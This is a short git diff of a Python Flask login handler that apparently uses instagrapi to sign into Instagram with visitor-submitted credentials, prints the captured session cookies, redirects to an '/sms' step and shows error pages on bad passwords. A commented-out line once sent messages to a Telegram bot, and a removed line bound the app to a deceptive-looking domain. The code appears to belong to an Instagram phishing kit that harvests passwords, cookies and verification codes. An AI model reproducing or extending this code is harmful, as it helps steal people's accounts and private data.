@@ -194,7 +194,7 @@ async def login():
              
              return redirect("/sms")
         if sifrehatali == True:
-            sifrehatali=True
+            sifrehatali=False
             return render_template('error.html')
 
         
@@ -208,7 +208,7 @@ async def login():
         
             
         
-        #await bot.send_message(chat_id=chat_id, text=mesaj)
+       
         
         print("Coocies budur=  "+str(kaya))
         print(str(aliu))
@@ -219,15 +219,6 @@ async def login():
         print("hata var")
         print(e)
         return  render_template('error.html')
-    
-    except instagrapi.exceptions.BadPassword:
-        print("hata var")
-        
-        return  render_template('error.html')
-    except:
-        print("hata var")
-       
-        return  render_template('error.html')
 
 
 
@@ -235,7 +226,6 @@ async def login():
 
 
 if __name__:
-
-    app.run(debug=True, host='sysytemnotfreezeinfor.com',port=80)
+    
     app.run(debug=True, host='0.0.0.0',port=80)
     
